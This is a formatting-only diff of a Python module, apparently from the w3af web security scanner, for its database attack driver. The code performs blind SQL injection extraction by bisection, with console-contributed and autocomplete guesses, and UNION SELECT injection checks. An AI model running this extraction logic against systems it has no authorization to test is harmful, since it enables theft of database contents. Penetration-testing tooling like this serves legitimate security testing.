@@ -38,77 +38,80 @@ class args:
 class dbDriverFunctions:
     '''
     This class stores all database driver methods.
-    
+
     @author: Andres Riancho (andres.riancho@gmail.com)
     '''
     def __init__(self, cmpFunction):
         self._cmpFunction = cmpFunction
         self.args = args()
-        
+
         # All needed for the good samaritan
         self._goodSamaritan = []
         self._tm = tm
         self._runningGS = False
         self._load_autocomplete_strings()
         self._previous_results = []
-        
+
     def _load_autocomplete_strings(self):
         '''
         This will load a list of autocomplete strings that will make blind sql injection
         exploitation faster. (i hope)
         '''
         self._autocomplete_strings = []
-        
-        string_file = os.path.join('plugins', 'attack', 'db', 'autocomplete.txt')
+
+        string_file = os.path.join(
+            'plugins', 'attack', 'db', 'autocomplete.txt')
         for line in file(string_file):
             line = line.strip()
             if line:
-                self._autocomplete_strings.append( line )
-    
-    def isRunningGoodSamaritan( self ):
+                self._autocomplete_strings.append(line)
+
+    def isRunningGoodSamaritan(self):
         return self._runningGS
 
-    def startGoodSamaritan( self ):
+    def startGoodSamaritan(self):
         om.out.debug('\r\nStarting good samaritan module, please help the blind man find his way.')
         self._runningGS = True
-    
-    def stopGoodSamaritan( self ):
+
+    def stopGoodSamaritan(self):
         if self._runningGS:
             om.out.debug('\r\nStopping good samaritan module.')
-            self._tm.join( self )
+            self._tm.join(self)
             self._runningGS = False
-        
-    def goodSamaritanContribution( self, contribution ):
+
+    def goodSamaritanContribution(self, contribution):
         '''
         A good samaritan typed something to the console and now I can use it to help the blind process.
         '''
-        om.out.console('Good samaritan contributed with: "' + contribution.strip('\n\r') + '"' )
-        self._goodSamaritan.append( contribution.strip('\n\r') )
-    
+        om.out.console('Good samaritan contributed with: "' +
+                       contribution.strip('\n\r') + '"')
+        self._goodSamaritan.append(contribution.strip('\n\r'))
+
     def info(self, message):
         """
         Print a log message if verbose is enabled.
         """
-        om.out.information( "[%s] [INFO] %s" % (time.strftime("%X"), message) )
+        om.out.information("[%s] [INFO] %s" % (time.strftime("%X"), message))
 
     def log(self, message):
         """
         Print a log message if verbose is enabled.
         """
-        om.out.debug( "[%s] [LOG] %s" % (time.strftime("%X"), message) )
+        om.out.debug("[%s] [LOG] %s" % (time.strftime("%X"), message))
 
     def warn(self, message):
         """
         Print a warning message if verbose is enabled.
         """
-        om.out.error( "[WARN] %s" % message)
+        om.out.error("[WARN] %s" % message)
 
     def urlReplace(self, parameter="", value="", newValue=""):
         mutant = self._vuln.get_mutant()
-        mutant.set_mod_value( self._vuln['falseValue'] + newValue )
-        
+        mutant.set_mod_value(self._vuln['falseValue'] + newValue)
+
         if mutant.get_dc():
-            baseUrl = mutant.getURL().uri2url() + '?' + urllib.unquote_plus( str( mutant.get_dc() ) )
+            baseUrl = mutant.getURL().uri2url(
+            ) + '?' + urllib.unquote_plus(str(mutant.get_dc()))
         else:
             baseUrl = mutant.getURL()
         return baseUrl
@@ -119,11 +122,11 @@ class dbDriverFunctions:
         url page.
         """
         m = self._vuln.get_mutant()
-        url = URL( url )
+        url = URL(url)
         m.set_dc(url.querystring)
-        m.setURL( url.uri2url() )
-        response = self._uri_opener.send_mutant( m )
-        if response.getCode() in range( 500, 599 ):
+        m.setURL(url.uri2url())
+        response = self._uri_opener.send_mutant(m)
+        if response.getCode() in range(500, 599):
             raise w3afException('getPage request returned an HTTP error 500.')
         return response.getBody()
 
@@ -141,7 +144,6 @@ class dbDriverFunctions:
         else:
             return False
 
-
     def bisectionAlgorithm(self, evilStm, exactEvilStm, expr, logMsg=True):
         baseUrl = self.urlReplace(newValue=evilStm)
 
@@ -150,7 +152,7 @@ class dbDriverFunctions:
         value = ""
         end = False
         rmFirstChar = True
-        
+
         while end != True:
             index += 1
             max = 127
@@ -164,46 +166,49 @@ class dbDriverFunctions:
                     else:
                         to_test_parsed = to_test
                         rmFirstChar = True
-                    
-                    to_test_escaped = self.unescape("'"+to_test_parsed+"'")
-                    exactEvilStm = exactEvilStm % (expr, index, len(to_test_parsed) , 'repla00ce_me_please')
-                    exactEvilStm = exactEvilStm.replace("'repla00ce_me_please'", to_test_escaped)
+
+                    to_test_escaped = self.unescape("'" + to_test_parsed + "'")
+                    exactEvilStm = exactEvilStm % (expr, index, len(
+                        to_test_parsed), 'repla00ce_me_please')
+                    exactEvilStm = exactEvilStm.replace(
+                        "'repla00ce_me_please'", to_test_escaped)
                     evilUrl = self.urlReplace(newValue=exactEvilStm)
                     evilResult = self.queryPage(evilUrl)
-                    
-                    if self._cmpFunction( evilResult, self.args.trueResult ):
+
+                    if self._cmpFunction(evilResult, self.args.trueResult):
                         value += to_test_parsed
                         if len(to_test_parsed) != 1:
                             index += len(to_test_parsed) - 1
                         om.out.console('\r\nGOOD guess: "%s", current blind string is: "%s"' % (value, value))
-                        om.out.console('\rgoodSamaritan('+value+')>>>', newLine=False)
+                        om.out.console('\rgoodSamaritan(' +
+                                       value + ')>>>', newLine=False)
                     else:
-                        om.out.console( '\r\nBad guess: "%s"' % to_test )
+                        om.out.console('\r\nBad guess: "%s"' % to_test)
                         index -= 1
-                
-                # Continue with next character 
+
+                # Continue with next character
                 self._goodSamaritan = []
                 continue
-            
+
             # Now some predictive text which is automatically added...
             # value is the variable that holds whatever we've already fetched from the DB
             if len(value) == 4:
                 for autocomplete in self._autocomplete_strings:
-                    if autocomplete.startswith( value ):
+                    if autocomplete.startswith(value):
                         self._goodSamaritan.append(autocomplete[4:])
-            
+
             while (max - min) != 1:
-                
+
                 # someone contributed
                 if self._goodSamaritan:
                     # Go to the good samaritan algorithm above
                     index -= 1
                     rmFirstChar = False
                     break
-                    
+
                 count += 1
                 limit = ((max + min) / 2)
-                
+
                 evilUrl = baseUrl % (expr, index, 1, limit)
                 try:
                     evilResult = self.queryPage(evilUrl)
@@ -211,9 +216,9 @@ class dbDriverFunctions:
                     try:
                         evilResult = self.queryPage(evilUrl)
                     except w3afException, w3:
-                        return count, value+'__incomplete exploitation__'
+                        return count, value + '__incomplete exploitation__'
 
-                if self._cmpFunction( evilResult, self.args.trueResult ):
+                if self._cmpFunction(evilResult, self.args.trueResult):
                     min = limit
                 else:
                     max = limit
@@ -225,19 +230,22 @@ class dbDriverFunctions:
 
                     val = chr(min + 1)
                     value = value + val
-                    
-                    if self._runningGS and cf.cf.get( 'demo'  ):
+
+                    if self._runningGS and cf.cf.get('demo'):
                         time.sleep(1.4)
-                        
-                    if self.args.verbose :
-                        self.log( 'bisectionAlgorithm found new char: "' + val + '" ; ord(val) == ' + str(ord(val)) )
-                        self.log( 'bisectionAlgorithm found value: "' + value + '" ; len(value) == ' + str(len(value)) )
+
+                    if self.args.verbose:
+                        self.log('bisectionAlgorithm found new char: "' +
+                                 val + '" ; ord(val) == ' + str(ord(val)))
+                        self.log('bisectionAlgorithm found value: "' + value +
+                                 '" ; len(value) == ' + str(len(value)))
                         if self._runningGS:
-                            om.out.console('\r'+' '*40, newLine = False)
-                            om.out.console('\rgoodSamaritan('+value+')>>>', newLine=False)
-        
-        self.log( 'bisectionAlgorithm final value: "' + value + '"' )
-        
+                            om.out.console('\r' + ' ' * 40, newLine=False)
+                            om.out.console('\rgoodSamaritan(' +
+                                           value + ')>>>', newLine=False)
+
+        self.log('bisectionAlgorithm final value: "' + value + '"')
+
         #
         #   I'm going to keep track of the results, and if I see one that repeats more than once,
         #   I'm adding it to the self._autocomplete_strings list.
@@ -248,21 +256,20 @@ class dbDriverFunctions:
         else:
             if len(value) >= 4:
                 self._previous_results.append(value)
-        
-        return count, value
 
+        return count, value
 
     def get_value(self, expression):
         logMsg = "query: %s" % expression
         self.log(logMsg)
 
         start = time.time()
-        
+
         expr = self.unescape(expression)
-        
+
         evilStm = self.createStm()
         exactEvilStm = self.createExactStm()
-        
+
         # This is kept here just for reference. This is from the original sqlmap code.
         '''
         if self.args.resumedQueries:
@@ -279,7 +286,7 @@ class dbDriverFunctions:
             self.args.writeFile.write("%s::%s::" % (self.args.url, expression))
             self.args.writeFile.flush()
         '''
-        
+
         count, value = self.bisectionAlgorithm(evilStm, exactEvilStm, expr)
         duration = int(time.time() - start)
 
@@ -287,7 +294,6 @@ class dbDriverFunctions:
         self.log(logMsg)
 
         return value
-
 
     def parseFp(self, dbms, fingerprint):
         fp = dbms
@@ -302,9 +308,8 @@ class dbDriverFunctions:
 
             return fp[:-4]
 
-
     def unionCheck(self):
-        logMsg  = "testing UNION SELECT statement on "
+        logMsg = "testing UNION SELECT statement on "
         logMsg += "parameter '%s'" % self.args.injParameter
         self.log(logMsg)
 
@@ -342,7 +347,8 @@ class dbDriverFunctions:
                             value = baseUrl
 
                             if not self.args.injectionMethod == "numeric":
-                                value = baseUrl.replace("SELECT NULL,", "SELECT")
+                                value = baseUrl.replace(
+                                    "SELECT NULL,", "SELECT")
 
                             self.args.unionCount = value.count("NULL")
 
@@ -362,7 +368,6 @@ class dbDriverFunctions:
                             return value
 
         return None
-
 
     def prepareUnionUse(self, expression, exprPosition):
         if self.args.injectionMethod == "numeric":
@@ -388,12 +393,11 @@ class dbDriverFunctions:
 
         return stm
 
-
     def unionUse(self, expression):
             count = 0
             start = time.time()
 
-            warnMsg  = "the target url is not affected by an inband "
+            warnMsg = "the target url is not affected by an inband "
             warnMsg += "SQL injection vulnerability or your "
             warnMsg += "expression is wrong"
 
@@ -433,7 +437,8 @@ class dbDriverFunctions:
                         # Parse the returned page to get the randValue value
                         startPosition = resultPage.index(randValueReplaced)
                         endPosition = startPosition + len(randValueReplaced)
-                        endCharacters = resultPage[endPosition:endPosition + 10]
+                        endCharacters = resultPage[
+                            endPosition:endPosition + 10]
 
                         # Perform the expression request then parse the
                         # returned page to get the expression output
@@ -458,11 +463,12 @@ class dbDriverFunctions:
                         logMsg = "request: %s" % baseUrl
                         self.log(logMsg)
 
-                        logMsg  = "the target url is affected by an "
+                        logMsg = "the target url is affected by an "
                         logMsg += "inband SQL injection vulnerability"
                         self.log(logMsg)
 
-                        logMsg = "performed %d queries in %d seconds" % (count, duration)
+                        logMsg = "performed %d queries in %d seconds" % (
+                            count, duration)
                         self.log(logMsg)
 
                         return str(startPage[:endPosition])
